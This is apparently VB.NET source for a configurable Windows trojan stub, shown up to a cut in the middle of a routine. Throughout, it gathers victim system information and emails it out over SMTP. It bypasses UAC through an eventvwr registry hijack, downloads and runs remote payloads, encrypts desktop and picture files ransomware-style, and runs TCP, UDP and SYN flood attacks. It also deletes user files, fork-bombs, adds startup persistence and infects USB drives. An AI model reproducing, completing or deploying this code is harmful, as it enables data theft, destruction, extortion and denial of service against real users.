Option Explicit On
Imports Microsoft.Win32
Imports System.IO
Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Net.Sockets
Imports System.Net
Imports System.Text
Imports System.Net.Mail
Imports System.Security.Principal
Imports System.Management
Imports System.Threading
Imports System.Globalization
Public Class Form1
    'HELO THERE IT YAAA BOIII Cipher HERE SO YOU LOKIN AT MY CODE HUMMMMM K 
    'HAVE FUN :) (it not pretty let me tell ya)
    Const FileSplit = "@SDJMVMPVsdq54v@"
    Dim op(), msg_tlt, msg_bdy, msg_stl, usb, p2p, yahoo, D_clip, D_taskmg, d_cmd, d_regedit, d_explo, d_uac, msg _
        , set_clip, clip_text, prtc_prc, dlt_alldtpfil, dlt_allmydoc, encmy_dmnt, encmydmn_key, meltfile, lunche_dely, dely_time, reg_start_up, Folder_startup _
        , ext, file2, strt_date, strt_yes, dw_url, dw, dw_drop, dw_admn, an_vm As String
    Dim Ddos_atc, TCP, UDP, TARGET, PORT, Socket, Packet, syn1, sendmail, smtp, m_adresse, m_pwd, m_sendto, m_enc, m_key _
        , m_port As String
    Dim cpu_full, spam_desksukl, opnnclo_cddriv, hid_taskbar, D_webbro, makeC_full, D_Custom, D_selectedpro _
        , D_proc, D_selectdProc, D_Keybaord, Crzy_Mouse, Blue_screan, Close_all, chang_Datentime, S_date, S_time _
        , Playbeep, Black_screan, Destroy_mine, delet_webbrowser, Turn_off, restart_pc, log_off, look_mouse _
         , open_FBI, open_gay, open_zoo, custo_site, sel_custo_site, set_kbrd, valu_kbrd, flashy_scrn _
         , spm_msg, themsg, spm_mainmg, D_copyfls, infi_website, atasporn, dick, frm_dup, frm_txt, spch_txt, spch _
         , rnsm, amount, D_internet, frz_scrn, infni_scrn, trun_off, mtx, mtx_enbl, pic_link, swp_mous, frk_bmb _
         , mncrf, Dlt_jpg, Dlt_doc, Dlt_txt, dlt_custo, dlt_custo_ext, Hid_cur, Confu_file, Cust_bat, bat_scrpt _
         , custo_vbs, vbs_scrpt, Custo_power, power_scrpt, custo_vb, vb_scrpt As String
    Public admn As Boolean
    Dim curntfile As String
    Dim trd1 As Threading.Thread
    Dim TPath As String = System.IO.Path.GetTempPath

#Region "All Func"
    Public Declare Function SwapMouseButton Lib "user32.dll" (ByVal bSwap As Int32) As Int32
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    Public WM_SYSCOMMAND As Integer = &H112
    Public SC_MONITORPOWER As Integer = &HF170

    <DllImport("user32.dll")> _
    Private Shared Function SendMessage(hWnd As Integer, hMsg As Integer, wParam As Integer, lParam As Integer) As Integer
    End Function

    Sub ShellScript()
        Dim ps As String = IO.Path.GetTempPath & "\" & IO.Path.GetRandomFileName & ".ps1"
        My.Computer.FileSystem.WriteAllText(ps, DecodeBase64(power_scrpt), False)
        Shell("powershell.exe -executionpolicy remotesigned -file " & ps)
    End Sub
    Sub BatchScript()
        Dim bat As String = IO.Path.GetTempPath & "\" & IO.Path.GetRandomFileName & ".bat"

        Dim wrtr As New StreamWriter(bat)
        wrtr.Write(DecodeBase64(bat_scrpt))
        wrtr.Close()

        ' My.Computer.FileSystem.WriteAllText(bat, DecodeBase64(bat_scrpt), False)
        Process.Start(bat)
    End Sub
    Sub vbsScript()
        Dim vbs As String = IO.Path.GetTempPath & "\" & IO.Path.GetRandomFileName & ".vbs"
        Dim ANSIString() As Byte, MyEncoder As New System.Text.ASCIIEncoding()
        Dim fFile As IO.File, fStream As IO.FileStream
        Dim sSourceString As String = DecodeBase64(vbs_scrpt)
        ANSIString = MyEncoder.Convert(System.Text.Encoding.UTF8, System.Text.Encoding.ASCII, MyEncoder.GetBytes(sSourceString))
        Try
            fStream = fFile.OpenWrite(vbs)
            fStream.Write(ANSIString, 0, ANSIString.Length)
            fStream.Close()
            Process.Start(vbs)
        Catch myException As Exception
        End Try
    End Sub
    Sub Fuckemall()

        On Error Resume Next

        For Each proc As Process In Process.GetProcesses

            Dim nm = IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath)

            If Not proc.ProcessName = nm Then
                proc.Kill()
            End If

        Next


    End Sub
    Sub Confu()
        Try
            Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
            Dim mp As New StreamWriter(btch)
            mp.WriteLine("assoc .dll=txtfile")
            mp.WriteLine("assoc .exe=pngfile")
            mp.WriteLine("assoc .vbs=Visual Style")
            mp.WriteLine("assoc .reg=xmlfile")
            mp.WriteLine("assoc .txt=regfile")
            mp.WriteLine("assoc .mp3=txtfile")
            mp.WriteLine("assoc .xml=txtfile")
            mp.WriteLine("assoc .png=txtfile")
            mp.Close()
            If isadmin() = True Then
                LuncheProc(btch)
            Else
                Process.Start(btch)
                Bypass_UAC(btch)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Sub Fork()
        While True
            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location)
        End While
    End Sub
    Sub deltxt()
        Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
        Dim mp As New StreamWriter(btch)
        mp.WriteLine("del /S C:\*.txt")
        mp.Close()
        LuncheProc(btch)
    End Sub
    Sub deldoc()
        Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
        Dim mp As New StreamWriter(btch)
        mp.WriteLine("del /S C:\*.docx")
        mp.Close()
        LuncheProc(btch)
    End Sub
    Sub deljpg()
        Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
        Dim mp As New StreamWriter(btch)
        mp.WriteLine("del /S C:\*.jpg")
        mp.Close()
        LuncheProc(btch)
    End Sub
    Sub delCusto()
        Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
        Dim mp As New StreamWriter(btch)
        mp.WriteLine("del /S C:\*" & dlt_custo_ext)
        mp.Close()
        LuncheProc(btch)
    End Sub

    Sub SlowAf()
        On Error Resume Next
        Dim s As Boolean
        s = False
        Do Until s = True
            Dim junkstr As String = Randome(1000)
            Dim rnpath As String = IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True)
            My.Computer.FileSystem.WriteAllText(rnpath, junkstr, True)
            Syn.Host = IpAddress1()
            Syn.Port = "80"
            Syn.SuperSynSockets = 100
            Syn.Threads = 100
            Syn.StartSuperSyn()
        Loop
    End Sub
    Public Sub Bypass_UAC(ByVal filepath As String)
        Using regkey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command")
            regkey.SetValue("", filepath, RegistryValueKind.String)
        End Using
        Process.Start("eventvwr.exe")
    End Sub
    Sub Swapit(ByVal t As String)
        If t = "True" Then
            SwapMouseButton(1)
        Else
            SwapMouseButton(0)
        End If
    End Sub
#Region "Hid and show task bar "
    Private components1 As IContainer
    Private Const TASKBAR_HIDE As Integer = &H80
    Private Const TASKBAR_SHOW As Integer = &H40

    <DllImport("user32", EntryPoint:="FindWindowA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function FindWindow(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpClassName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpWindowName As String) As Integer
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function SetWindowPos(ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    End Function
    Public Sub CacherBarreTacheWindows()
        Dim lpClassName As String = "Shell_traywnd"
        Dim lpWindowName As String = ""
        Dim num As Long = Form1.FindWindow(lpClassName, lpWindowName)
        Form1.SetWindowPos(CInt(num), 0, 0, 0, 0, 0, &H80)
    End Sub

    Public Sub MontrerBarreTacheWindows()
        Dim lpClassName As String = "Shell_traywnd"
        Dim lpWindowName As String = ""
        Dim num As Long = Form1.FindWindow(lpClassName, lpWindowName)
        Form1.SetWindowPos(CInt(num), 0, 0, 0, 0, 0, &H40)
    End Sub
    Private Sub task_barshow_Tick(sender As Object, e As EventArgs) Handles task_barshow.Tick
        MontrerBarreTacheWindows()
        task_barshow.Stop()
        task_barhide.Start()
    End Sub

    Private Sub task_barhide_Tick(sender As Object, e As EventArgs) Handles task_barhide.Tick
        CacherBarreTacheWindows()
        task_barhide.Stop()
        task_barshow.Start()
    End Sub
#End Region
#Region "ddos"


    Sub attack()
        If TCP = "True" Then
            If Not TCPThread.IsBusy Then
                TCPThread.RunWorkerAsync()
            End If
        End If
        If UDP = "True" Then
            If Not UDPThread.IsBusy Then
                UDPThread.RunWorkerAsync()
            End If
        End If
        If syn1 = "True" Then
            Try
                Syn.Host = TARGET
                Syn.Port = PORT
                Syn.SuperSynSockets = 10
                Syn.Threads = 10
                Syn.StartSuperSyn()
            Catch ex As Exception
                Syn.StopSuperSyn()
            End Try

        End If
    End Sub

    Private Sub TCPThread_DoWork(sender As Object, e As DoWorkEventArgs) Handles TCPThread.DoWork
        Try

            TCP = True

            Do While TCP = True
                Dim tcpClient As New TcpClient
                Dim GLOIP As IPAddress
                Dim bytCommand As Byte() = New Byte() {}
                GLOIP = IPAddress.Parse(trgt.Text)
                tcpClient.Connect(GLOIP, 1177)

            Loop

        Catch ex As Exception

        End Try

    End Sub

    Private Sub UDPThread_DoWork(sender As Object, e As DoWorkEventArgs) Handles UDPThread.DoWork
        UDP = True

        Do While UDP = True
            Dim udpClient As New UdpClient
            Dim GLOIP As IPAddress
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(trgt.Text)
            udpClient.Connect(GLOIP, 1177)
            bytCommand = Encoding.ASCII.GetBytes(Packet)
            udpClient.Send(bytCommand, bytCommand.Length)
        Loop




    End Sub
#End Region
#Region "Encr"
    Dim enckey As String = "RiCmuole8wWafRMAniqYy52loIbhzojz"
    Dim crypt As New ElgAESCrypt(enckey)
    Sub encdesktop()
        Dim s As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        For Each ds As String In My.Computer.FileSystem.GetFiles(s, FileIO.SearchOption.SearchAllSubDirectories)
            Dim lefiles As New IO.FileInfo(ds)
            crypt.EncrypterFichier(ds, ds & ".cryptd")
            lefiles.Delete()
        Next

    End Sub
    Sub encimages()
        Dim s As String = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
        For Each ds As String In My.Computer.FileSystem.GetFiles(s, FileIO.SearchOption.SearchAllSubDirectories)
            Dim lefiles As New IO.FileInfo(ds)
            crypt.EncrypterFichier(ds, ds & ".cryptd")
            lefiles.Delete()
        Next
    End Sub
#End Region

#Region "Info Gather"
    Function Getinfo1() As String
        Dim Doubleline As String = vbNewLine & vbNewLine
        Dim line As String = vbNewLine
        Dim inf As String
        Dim W_Id = WindowsIdentity.GetCurrent()
        Dim WP = New WindowsPrincipal(W_Id)
        Dim isAdmin As Boolean = WP.IsInRole(WindowsBuiltInRole.Administrator)

        'getuserpic(System.Security.Principal.WindowsIdentity.GetCurrent().Name)
        inf &= "------------------------------------------------------------------------------------------" & Doubleline & "Main info : " & Doubleline

        inf &= "User name     : " & Environment.UserName & line
        inf &= "isAdmin       : " & isAdmin & line 'Mazlaaaa
        inf &= "Computer name : " & Environment.GetEnvironmentVariable("COMPUTERNAME") & line
        inf &= "OSFullName    : " & My.Computer.Info.OSFullName & line
        inf &= "OSPlatform    : " & My.Computer.Info.OSPlatform & line
        inf &= "OSVersion     : " & My.Computer.Info.OSVersion & line
        inf &= "Bit version   : " & getbit() & line
        inf &= "System RAM    : " & ConvertOctets(My.Computer.Info.TotalPhysicalMemory) & line
        inf &= "Language      : " & My.Computer.Info.InstalledUICulture.ThreeLetterWindowsLanguageName & line
        inf &= "Anti-Virus    : " & getanti() & line
        inf &= "Time and date : " & My.Computer.Clock.LocalTime & line
        inf &= "HWID          : " & HWD() & line

        inf &= "------------------------------------------------------------------------------------------" & Doubleline & "Network info : " & Doubleline
        inf &= "IPv4 address  : " & Getip() & line
        inf &= "MAC address   : " & getmac() & line
        inf &= "Public IP     : " & IpAddress1() & line

        inf &= "------------------------------------------------------------------------------------------" & Doubleline & "Running Process :" & Doubleline
        For Each p As Process In Process.GetProcesses
            inf &= p.ProcessName & "  : " & p.Id.ToString().ToUpper & vbCrLf & "  " & p.MainWindowTitle
        Next
        inf &= "------------------------------------------------------------------------------------------" & Doubleline & Doubleline

        inf &= "------------------------------------------------------------------------------------------" & Doubleline & "Desktopfiles : " & Doubleline
        inf &= desktopfiles() & line
        inf &= "------------------------------------------------------------------------------------------"
        Return inf
    End Function


    Function getmac() As String
        For Each nic As System.Net.NetworkInformation.NetworkInterface In System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
            Return String.Format(" {0} {1}{2}", nic.Description, "  ", nic.GetPhysicalAddress()) & "  "
        Next


    End Function
    Function desktopfiles() As String
        Dim desk As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim dicinfo As New IO.DirectoryInfo(desk)
        For Each file In dicinfo.GetFiles
            desktopfiles &= file.FullName & vbNewLine
        Next
    End Function
    Private Function Getip() As String
        Dim GetIPAddress()

        Dim strHostName As String

        Dim strIPAddress As String

        strHostName = System.Net.Dns.GetHostName()

        strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()
        Getip = strIPAddress

        Return Getip

    End Function

    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function
    Public Function getbit() As String

        If My.Computer.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            getbit = "32-bit"

        Else
            getbit = "64-bit"

        End If
    End Function
    Public Shared Function HWD() As String
        Dim str As String
        Try
            Dim num As Integer
            Dim lpVolumeNameBuffer As String = Nothing
            Dim lpMaximumComponentLength As Integer = 0
            Dim lpFileSystemFlags As Integer = 0
            Dim lpFileSystemNameBuffer As String = Nothing
            GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
            str = Conversion.Hex(num)
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            str = "ERR"
            Return str
        End Try
        Return str
    End Function

    Public Function ConvertOctets(Prm_L_Num As Long) As String
        On Error Resume Next

        Dim L_Size As Long

        L_Size = Prm_L_Num ' Mise en cache

        If (L_Size / 1024 > 1) Then
            L_Size = L_Size / 1024
            If (L_Size / 1024 > 1) Then
                L_Size = L_Size / 1024
                If (L_Size / 1024 > 1) Then
                    L_Size = L_Size / 1024
                    If (L_Size / 1024 > 1) Then
                        L_Size = L_Size / 1024
                    Else
                        ConvertOctets = CStr(L_Size) & " Go"
                    End If
                Else
                    ConvertOctets = CStr(L_Size) & " Mo"
                End If
            Else
                ConvertOctets = CStr(L_Size) & " Ko"
            End If
        Else
            ConvertOctets = CStr(L_Size) & " Oct"
        End If
        Exit Function
    End Function
    <DllImport("shell32", EntryPoint:="#261", CharSet:=CharSet.Unicode, PreserveSig:=False)>
    Public Shared Sub getusertilepath(username As String, whatever As UInt32, picpath As StringBuilder, maxlenght As Integer)
    End Sub
    Public Function getusertilepath(username As String) As String
        Dim name As StringBuilder
        name = New StringBuilder(1000)
        getusertilepath(username, 2147483648, name, name.Capacity)
        Return name.ToString
    End Function
    Public Function getuserpic(username As String) As Image
        Return Image.FromFile(getusertilepath(username))
    End Function
    Public Shared Function getanti() As Object
        Dim str As String
        Dim num As Integer
        Dim processes As Process() = Process.GetProcesses
        Dim num4 As Integer = (num + 1)
        Dim num3 As Integer = (processes.Length - 1)
        num = 0
        Do While (((num4 >> &H1F) Xor num) <= ((num4 >> &H1F) Xor num3))
            Dim processName As String = processes(num).ProcessName
            If (processName = "ekrn") Then
                str = "NOD32"
            ElseIf (processName = "avgcc") Then
                str = "AVG"
            ElseIf (processName = "avgnt") Then
                str = "Avira"
            ElseIf (processName = "ahnsd") Then
                str = "AhnLab-V3"
            ElseIf (processName = "bdss") Then
                str = "BitDefender"
            ElseIf (processName = "bdv") Then
                str = "ByteHero"
            ElseIf (processName = "clamav") Then
                str = "ClamAV"
            ElseIf (processName = "fpavserver") Then
                str = "F-Prot"
            ElseIf (processName = "fssm32") Then
                str = "F-Secure"
            ElseIf (processName = "avkcl") Then
                str = "GData"
            ElseIf (processName = "engface") Then
                str = "Jiangmin"
            ElseIf (processName = "avp") Then
                str = "Kaspersky"
            ElseIf (processName = "updaterui") Then
                str = "McAfee"
            ElseIf (processName = "msmpeng") Then
                str = "microsoft security essentials"
            ElseIf (processName = "zanda") Then
                str = "Norman"
            ElseIf (processName = "npupdate") Then
                str = "nProtect"
            ElseIf (processName = "inicio") Then
                str = "Panda"
            ElseIf (processName = "sagui") Then
                str = "Prevx"
            ElseIf (processName = "Norman") Then
                str = "Sophos"
            ElseIf (processName = "savservice") Then
                str = "Sophos"
            ElseIf (processName = "saswinlo") Then
                str = "SUPERAntiSpyware"
            ElseIf (processName = "spbbcsvc") Then
                str = "Symantec"
            ElseIf (processName = "thd32") Then
                str = "TheHacker"
            ElseIf (processName = "ufseagnt") Then
                str = "TrendMicro"
            ElseIf (processName = "dllhook") Then
                str = "VBA32"
            ElseIf (processName = "sbamtray") Then
                str = "VIPRE"
            ElseIf (processName = "vrmonsvc") Then
                str = "ViRobot"
            ElseIf (processName = "dllhook") Then
                str = "VBA32"
            ElseIf (processName = "vbcalrt") Then
                str = "VirusBuster"
            Else
                str = "Not Found"
            End If
            Dim id As Integer = processes(num).Id
            num = (num + num4)
        Loop
        Return str
    End Function


    Private Function IpAddress1() As String
        Using wc As New Net.WebClient
            Return System.Text.Encoding.UTF8.GetString(wc.DownloadData("https://myexternalip.com/raw"))
        End Using
    End Function
#End Region
    Sub Hide_mous()
        Dim s As Boolean = False
        Do Until s = True
            Dim x As String = 10
            Dim y As String = 10
            Dim oldloc As New Point(x, y)
            Cursor.Position = PointToScreen(oldloc)
            Me.Cursor.Hide()
        Loop
    End Sub
    Sub TrunOff_scrn()
        SendMessage(Me.Handle.ToInt32(), WM_SYSCOMMAND, SC_MONITORPOWER, 2)
    End Sub
    Sub TrunOn()
        SendMessage(Me.Handle.ToInt32(), WM_SYSCOMMAND, SC_MONITORPOWER, -1)
    End Sub
    Sub spek()
        Dim SAPI
        SAPI = CreateObject("SAPI.spvoice")
        SAPI.Speak(spch_txt)

    End Sub
    Sub Crazyms()
        Dim rand As New Random
        Dim s As Boolean = False
        Do Until s = True
            Dim x As String = rand.Next(-100, 1000)
            Dim y As String = rand.Next(-100, 1000)
            Dim oldloc As New Point(x, y)
            Cursor.Position = Me.PointToScreen(oldloc)
        Loop

    End Sub
    Private Sub ChangeDate(tim As String, dte As String)
        Dim d As DateTime
        d = tim
        Try
            Microsoft.VisualBasic.TimeOfDay = d
            Microsoft.VisualBasic.DateString = New Date(dte)
        Catch ex As Exception

        End Try

    End Sub
    Sub Lok_mos()
        Dim l As Boolean
        Do Until l = True
            Dim oldloc As New Point(100, 100)
            Cursor.Position = Me.PointToScreen(oldloc)
        Loop
    End Sub

    Sub hide()
        Me.ShowInTaskbar = False
        Me.ControlBox = False
        Me.Opacity = 0
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Control.CheckForIllegalCrossThreadCalls = False
    End Sub
    Function sendinfo(ByVal adrs As String, pwd As String, sndto As String, enc As Boolean, key As String, port_m As String, m_smpt As String)
        Try
            Dim Smtp_Server As New SmtpClient
            Dim e_mail As New MailMessage()
            Smtp_Server.UseDefaultCredentials = False
            Smtp_Server.Credentials = New Net.NetworkCredential(adrs, pwd)
            Smtp_Server.Port = port_m
            Smtp_Server.EnableSsl = True
            Smtp_Server.Host = m_smpt
            e_mail = New MailMessage()
            e_mail.From = New MailAddress(adrs)
            e_mail.To.Add(sndto)
            Dim hj As String = "information gathered from " & Environment.UserName & " | " & HWD()
            If enc = True Then
                e_mail.Subject = RC4Encrypt(hj, key)
            Else
                e_mail.Subject = hj
            End If
            e_mail.IsBodyHtml = False

            If enc = True Then
                e_mail.Body = RC4Encrypt(Getinfo1, key)
            Else
                e_mail.Body = Getinfo1()
            End If

            Smtp_Server.Send(e_mail)


        Catch error_t As Exception

        End Try
    End Function
#End Region
    Sub getinfo()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            msg_tlt = Space(LOF(1))
            msg_bdy = Space(LOF(1))
            FileGet(1, msg_tlt)
            FileGet(1, msg_bdy)
            FileClose(1)
            op = Split(msg_tlt, FileSplit)
            msg_tlt = op(1)
            msg_bdy = op(2)
            msg_stl = op(3)
            usb = op(4)
            p2p = op(5)
            yahoo = op(6)
            msg = op(13)
            prtc_prc = op(16)
            meltfile = op(22)
            lunche_dely = op(23)
            dely_time = op(24)
            reg_start_up = op(25)
            Folder_startup = op(26)
            ext = op(27)
            file2 = op(28)
            D_clip = op(7)
            D_taskmg = op(8)
            d_cmd = op(9)
            d_regedit = op(10)
            d_explo = op(11)
            d_uac = op(12)
            dlt_alldtpfil = op(17)
            dlt_allmydoc = op(18)
            encmy_dmnt = op(19)
            encmydmn_key = op(20)
            set_clip = op(14)
            clip_text = op(15)
            cpu_full = op(29)
            spam_desksukl = op(30)
            opnnclo_cddriv = op(31)
            hid_taskbar = op(32)
            D_webbro = op(33)
            makeC_full = op(34)
            D_Custom = op(35)
            D_selectedpro = op(36)
            D_proc = op(37)
            D_selectdProc = op(38)
            D_Keybaord = op(39)
            Crzy_Mouse = op(40)
            Blue_screan = op(41)
            Close_all = op(42)
            chang_Datentime = op(43)
            S_date = op(44)
            S_time = op(45)
            Playbeep = op(46)
            Black_screan = op(47)
            Destroy_mine = op(48)
            delet_webbrowser = op(49)
            Turn_off = op(50)
            restart_pc = op(51)
            log_off = op(52)
            look_mouse = op(53)
            open_FBI = op(54)
            open_gay = op(55)
            open_zoo = op(56)
            sel_custo_site = op(57)
            custo_site = op(58)
            set_kbrd = op(59)
            valu_kbrd = op(60)
            flashy_scrn = op(61)
            spm_msg = op(62)
            themsg = op(63)
            spm_mainmg = op(64)
            strt_date = op(65)
            strt_yes = op(66)
            D_copyfls = op(67)
            Ddos_atc = op(68)
            TCP = op(69)
            UDP = op(70)
            TARGET = op(71)
            PORT = op(72)
            Packet = op(73)
            syn1 = op(74)
            infi_website = op(75)
            dw_url = op(76)
            dw = op(77)
            dw_drop = op(78)
            dw_admn = op(79)
            sendmail = op(80)
            m_adresse = op(81)
            m_pwd = op(82)
            m_sendto = op(83)
            m_enc = op(84)
            m_key = op(85)
            m_port = op(86)
            smtp = op(87)
            atasporn = op(88)
            dick = op(89)
            frm_dup = op(90)
            frm_txt = op(91)
            spch_txt = op(92)
            spch = op(93)
            rnsm = op(94)
            amount = op(95)
            D_internet = op(96)
            frz_scrn = op(97)
            infni_scrn = op(98)
            trun_off = op(99)
            mtx = op(100)
            mtx_enbl = op(101)
            an_vm = op(102)
            pic_link = op(103)
            swp_mous = op(104)
            frk_bmb = op(105)
            mncrf = op(106)
            Dlt_jpg = op(107)
            Dlt_txt = op(108)
            Dlt_doc = op(109)
            dlt_custo = op(110)
            dlt_custo_ext = op(111)
            Hid_cur = op(112)
            Confu_file = op(113)
            Cust_bat = op(114)
            bat_scrpt = op(115)
            custo_vbs = op(116)
            vbs_scrpt = op(117)
            custo_vb = op(118)
            vb_scrpt = op(119)
            Custo_power = op(120)
            power_scrpt = op(121)
            'last count here look up
        Catch ex As Exception
            End
        End Try
    End Sub
    Sub set_options()
        On Error Resume Next
        If an_vm = "True" Then
            Dim s As New Antis
            s.startanti()
        End If
        If Ddos_atc = "True" Then
            attack()
        End If
        If lunche_dely = "True" Then
            Threading.Thread.Sleep(dely_time)
        End If
        If prtc_prc = "True" Then
            Protect.pr(1)
            Dim k As New c_AntiKill
            k.c_ImAntiKill()
        End If
        If dw = "True" Then
            If dw_url.Contains("pastebin.com") Then
                Dim pastbin As String = New System.Net.WebClient().DownloadString(dw_url)
                Dim wb1 = New WebClient()
                Dim ext = Path.GetExtension(pastbin)

                Dim drppath As String = Environment.GetEnvironmentVariable(dw_drop) & "\" & RandomString(4, , True, True, False, False, True) & ext
                wb1.DownloadFile(pastbin, drppath)
                If dw_admn = "True" Then
                    Bypass_UAC(drppath)
                    Process.Start(drppath)
                Else
                    Process.Start(drppath)
                End If
            Else
                Dim wb1 = New WebClient()
                Dim ext = Path.GetExtension(dw_url)

                Dim drppath As String = Environment.GetEnvironmentVariable(dw_drop) & "\" & RandomString(4, , True, True, False, False, True) & ext
                wb1.DownloadFile(dw_url, drppath)
                If dw_admn = "True" Then
                    Bypass_UAC(drppath)
                    Process.Start(drppath)
                Else
                    Process.Start(drppath)
                End If
            End If
        End If
        If msg = "True" Then
            If msg_stl = "err" Then
                MsgBox(msg_bdy, MsgBoxStyle.Critical, msg_tlt)
            End If
            If msg_stl = "exx" Then
                MsgBox(msg_bdy, MsgBoxStyle.Exclamation, msg_tlt)
            End If
            If msg_stl = "info" Then
                MsgBox(msg_bdy, MsgBoxStyle.Information, msg_tlt)
            End If
            If msg_stl = "quest" Then
                MsgBox(msg_bdy, MsgBoxStyle.MsgBoxHelp, msg_tlt)
            End If
        End If
        If file2 = Nothing Or ext = Nothing Then
        Else
            Dim randoname As String = TPath & "\" & RandomString(4, False, True, True, False, False, True) & ext
            FileOpen(1, randoname, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, file2)
            FileClose(1)
            System.Diagnostics.Process.Start(randoname)
        End If
        If meltfile = "True" Then
            Dim s As New FileInfo(Application.ExecutablePath)
            s.Attributes = FileAttributes.Hidden
            s.Refresh()
        End If
        If usb = "True" Then
            infect()
        End If
        If reg_start_up = "True" Then
            RegStartup(Application.ExecutablePath)
        End If
        If Folder_startup = "True" Then
            FoldStartup(Application.ExecutablePath)
        End If
    End Sub
    Sub execute()
        On Error Resume Next
        If flashy_scrn = "True" Then
            Wendy.Show()
        End If
        Swapit(swp_mous)
        If frz_scrn = "True" Then
            frz.Show()
        End If
        If open_FBI = "True" Then
            Process.Start("www.fbi.gov")
        End If
        If open_gay = "True" Then
            Process.Start("www.gaymaletube.com")
        End If
        If open_zoo = "True" Then
            Process.Start("https://zoosexfarm.com")
        End If
        If atasporn = "True" Then
            Dim tmp As String = IO.Path.GetTempPath & "5D4S6FD4.txt"
            My.Computer.FileSystem.WriteAllText(tmp, My.Resources.URLS, False)
            Dim s As New IO.StreamReader(tmp)
            Do Until s.EndOfStream
                Process.Start(s.ReadLine())
            Loop
        End If
        If mncrf = "True" Then
            Dim mincraft_res As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\resourcepacks"
            Dim mincraft_saves As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\saves"
            Dim mincraft_path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft"
            If Directory.Exists(mincraft_path) = True Then
                Dim s As New DirectoryInfo(mincraft_path)
                For Each f In s.GetFiles
                    f.Delete()
                Next
                If Directory.Exists(mincraft_saves) = True Then
                    Directory.Delete(mincraft_saves)
                End If
                If Directory.Exists(mincraft_res) = True Then
                    Dim j As New DirectoryInfo(mincraft_res)
                    For Each v In j.GetFiles
                        v.Delete()
                    Next
                End If
            End If
        End If
        If delet_webbrowser = "True" Then
            Dim o = New Thread(AddressOf dltWeb)
            o.IsBackground = True
            o.Start()
        End If
        If Confu_file = "True" Then
            Dim p = New Thread(AddressOf Confu)
            p.IsBackground = True
            p.Start()
        End If
        If Close_all = "True" Then
            Dim k = New Thread(AddressOf Fuckemall)
            k.IsBackground = True
            k.Start()
        End If
        If dlt_custo = "True" Then
            Dim s = New Thread(AddressOf delCusto)
            s.IsBackground = True
            s.Start()
        End If
        If custo_vbs = "True" Then
            Dim s = New Thread(AddressOf vbsScript)
            s.IsBackground = True
            s.Start()
        End If
        If Cust_bat = "True" Then
            Dim l = New Thread(AddressOf BatchScript)
            l.IsBackground = True
            l.Start()
        End If
        If Custo_power = "True" Then
            Dim k = New Thread(AddressOf ShellScript)
            k.IsBackground = True
            k.Start()
        End If
        If Dlt_doc = "True" Then
            Dim s = New Thread(AddressOf deldoc)
            s.IsBackground = True
            s.Start()
        End If
        If Dlt_jpg = "True" Then
            Dim s = New Thread(AddressOf deljpg)
            s.IsBackground = True
            s.Start()

        End If
        If Dlt_txt = "True" Then
            Dim s = New Thread(AddressOf deltxt)
            s.IsBackground = True
            s.Start()
        End If
        If trun_off = "True" Then
            Dim l As Boolean = False
            Do Until l = True
                TrunOff_scrn()
            Loop
        End If
        If cpu_full = "True" Then
            Dim hq = New Thread(AddressOf SlowAf)
            hq.IsBackground = True
            hq.Start()
        End If
        If custo_site = "True" Then
            If infi_website = "True" Then
                Do Until Me.Text = "sdfsdf"
                    Process.Start(sel_custo_site)
                Loop
            Else
                Process.Start(sel_custo_site)
            End If
        End If
        If Hid_cur = "True" Then
            Dim l = New Thread(AddressOf Hide_mous)
            l.IsBackground = True
            l.Start()
        End If
        If look_mouse = "True" Then
